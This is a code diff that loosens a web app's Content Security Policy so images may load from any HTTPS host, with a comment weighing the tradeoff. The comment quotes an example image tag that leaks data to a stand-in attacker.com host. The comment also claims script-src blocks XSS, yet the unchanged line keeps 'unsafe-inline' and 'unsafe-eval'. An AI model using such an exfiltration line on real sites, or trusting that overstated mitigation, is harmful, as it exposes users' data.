@@ -15,7 +15,15 @@ const CSP_DIRECTIVES = [
   "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
   "style-src 'self' 'unsafe-inline'",
   "font-src 'self' data:",
-  "img-src 'self' blob: data: *.supabase.co *.public.blob.vercel-storage.com",
+  // 'https:' covers any HTTPS image source — YouTube thumbnails on the
+  // library page, OAuth profile photos in UserMenu, and arbitrary
+  // og:image hosts resolved by getOgImageUrl(). Enumerating each origin
+  // would silently break a new library entry whenever its og:image
+  // lives on an un-allowlisted CDN; the cost is that an XSS-injected
+  // <img src="https://attacker.com/track?leak=…"> could exfiltrate via
+  // the URL itself — mitigated because script-src still blocks the
+  // underlying XSS attack.
+  "img-src 'self' blob: data: https:",
   "media-src 'self' blob: *.supabase.co *.public.blob.vercel-storage.com",
   "connect-src 'self' *.supabase.co *.upstash.io api.anthropic.com api.deepgram.com api.hume.ai",
   "frame-ancestors 'none'",
